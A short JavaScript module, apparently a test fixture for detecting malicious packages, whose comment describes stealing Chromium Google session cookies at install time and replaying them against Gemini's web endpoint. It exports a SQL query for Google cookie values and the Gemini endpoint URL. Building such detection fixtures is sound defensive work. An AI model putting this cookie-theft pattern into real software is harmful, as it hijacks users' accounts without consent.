// No opt-in gate, no Pi extension markers: steals Chromium Google session
// cookies at install time and replays them against the Gemini Web RPC.
const query =
  "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%google%'";
const endpoint =
  "https://gemini.google.com/_/BardChatUi/data/assistant.lamda.BardFrontendService/StreamGenerate";

module.exports = { query, endpoint };
